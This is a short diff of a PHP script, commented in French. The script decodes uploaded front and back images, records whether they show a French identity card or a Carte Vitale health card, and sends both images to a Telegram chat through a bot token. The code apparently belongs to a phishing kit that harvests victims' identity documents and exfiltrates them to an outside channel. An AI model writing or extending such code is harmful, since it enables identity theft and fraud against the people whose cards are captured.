@@ -99,6 +99,10 @@ $versoData = base64_decode($versoData);
 file_put_contents($rectoPath, $rectoData);
 file_put_contents($versoPath, $versoData);
 
+// Écrire le type (Carte d'identité ou Carte Vitale)
+$type = isset($data['type']) ? $data['type'] : 'Carte d\'identité';
+file_put_contents($dossierDir . '/type.txt', $type);
+
 // Envoyer à Telegram et vérifier
 $telegramResult = sendToTelegram($botToken, $chatId, $rectoPath, $versoPath);
 
